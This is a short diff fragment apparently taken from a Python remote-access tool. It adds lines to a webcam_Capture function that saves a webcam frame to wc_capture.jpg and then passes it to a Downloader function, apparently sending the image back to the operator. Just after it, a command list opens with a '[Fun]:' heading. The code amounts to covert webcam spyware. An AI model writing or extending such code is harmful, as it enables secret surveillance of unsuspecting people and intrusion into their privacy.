@@ -959,10 +959,13 @@ def webcam_Capture():
 	rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2BGRA)
 
 	cv2.imshow('frame', rgb)
+	# Save web cam screenshot...
 	out = cv2.imwrite('wc_capture.jpg', frame)
 
 	cap.release()
 	cv2.destroyAllWindows()
+	# Deliver web cam screenshot...
+	Downloader('wc_capture.jpg')
 
 cmdList = """
 [Fun]:
